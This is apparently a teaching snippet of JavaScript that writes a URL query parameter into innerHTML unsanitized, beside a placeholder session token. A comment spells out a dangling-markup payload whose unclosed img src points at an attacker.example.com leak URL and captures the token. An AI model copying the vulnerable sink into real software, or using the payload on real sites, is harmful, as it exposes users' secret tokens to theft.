// SOURCE: the query string of the URL
const comment = new URLSearchParams(location.search).get("comment") ?? "";

// A stand-in for something genuinely secret, like a CSRF token, rendered
// into the same chunk of HTML as the comment.
const sessionToken = "tok-9f8a7b-secret";

// SINK: innerHTML, no sanitizing. If "comment" contains an unterminated
// attribute, like <img src="https://attacker.example.com/leak?data=, the
// browser keeps reading everything after it — including sessionToken below —
// as part of that attribute's value, until some later quote character closes it.
document.getElementById("page").innerHTML =
  "<p>Latest comment: " + comment + "</p>" +
  "<p>Your session token (never share this): <b>" + sessionToken + "</b></p>" +
  '<footer class="site-footer">Thanks for visiting.</footer>';
